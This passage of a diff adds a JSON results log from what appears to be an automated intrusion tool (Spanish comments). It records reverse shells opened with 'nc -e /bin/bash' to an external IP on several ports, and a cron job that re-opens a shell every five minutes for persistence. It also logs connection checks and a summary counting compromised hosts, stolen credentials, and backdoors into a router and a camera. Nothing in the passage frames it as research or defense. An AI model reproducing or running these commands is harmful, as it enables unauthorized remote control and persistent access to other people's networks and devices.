+        ],
+        "real_implementation": true
+      },
+      {
+        "service": "reverse_shell",
+        "port": 4446,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4446",
+        "listener_command": "nc -lvp 4446",
+        "process_id": 14624,
+        "access_methods": [
+          "nc -lvp 4446  # En el servidor externo",
+          "nc 212.95.62.135 4446  # Conexión directa",
+          "telnet 212.95.62.135 4446  # Via telnet"
+        ],
+        "real_implementation": true
+      },
+      {
+        "service": "reverse_shell",
+        "port": 4447,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4447",
+        "listener_command": "nc -lvp 4447",
+        "process_id": 14627,
+        "access_methods": [
+          "nc -lvp 4447  # En el servidor externo",
+          "nc 212.95.62.135 4447  # Conexión directa",
+          "telnet 212.95.62.135 4447  # Via telnet"
+        ],
+        "real_implementation": true
+      },
+      {
+        "service": "reverse_shell",
+        "port": 4448,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4448",
+        "listener_command": "nc -lvp 4448",
+        "process_id": 14628,
+        "access_methods": [
+          "nc -lvp 4448  # En el servidor externo",
+          "nc 212.95.62.135 4448  # Conexión directa",
+          "telnet 212.95.62.135 4448  # Via telnet"
+        ],
+        "real_implementation": true
+      },
+      {
+        "service": "persistent_reverse_shell",
+        "port": 4444,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "cron_entry": "*/5 * * * * nc -e /bin/bash 212.95.62.135 4444",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4444",
+        "listener_command": "nc -lvp 4444",
+        "access_methods": [
+          "nc -lvp 4444  # En el servidor externo",
+          "nc 212.95.62.135 4444  # Conexión directa"
+        ],
+        "persistence_method": "cron_job",
+        "real_implementation": true
+      }
+    ],
+    "errors": [],
+    "vulnerable_backdoors": []
+  },
+  "phase_5_verification": {
+    "status": "completed",
+    "persistence_checks": [],
+    "access_verification": [
+      {
+        "type": "connection_verification",
+        "host": "192.168.1.1",
+        "port": 22,
+        "status": "connected",
+        "verified": true,
+        "timestamp": 1757383916.229131
+      },
+      {
+        "type": "connection_verification",
+        "host": "192.168.1.1",
+        "port": 22,
+        "status": "connected",
+        "verified": true,
+        "timestamp": 1757383916.2291336
+      },
+      {
+        "type": "connection_verification",
+        "host": "192.168.1.1",
+        "port": 22,
+        "status": "connected",
+        "verified": true,
+        "timestamp": 1757383916.2291346
+      },
+      {
+        "type": "connection_verification",
+        "host": "192.168.1.1",
+        "port": 22,
+        "status": "connected",
+        "verified": true,
+        "timestamp": 1757383916.229135
+      },
+      {
+        "type": "connection_verification",
+        "host": "192.168.1.1",
+        "port": 22,
+        "status": "connected",
+        "verified": true,
+        "timestamp": 1757383916.2291353
+      }
+    ],
+    "errors": []
+  },
+  "cleanup": {
+    "status": "pending",
+    "items_cleaned": [],
+    "errors": []
+  },
+  "summary": {
+    "total_hosts": 8,
+    "compromised_hosts": 5,
+    "persistent_access_points": 0,
+    "total_credentials": 5,
+    "execution_time": 373.0566782951355,
+    "success_rate": 62.5,
+    "cameras_accessed": 1,
+    "router_access": 1,
+    "network_services": 6,
+    "total_remote_access_points": 8,
+    "external_backdoors": 8,
+    "internal_backdoors": 0,
+    "external_backdoor_types": [
+      "Router Access (1)",
+      "Network Services (6)",
+      "Camera Backdoors (1)"
+    ],
+    "internal_backdoor_types": [],
+    "remote_access_available": true
   }
+}
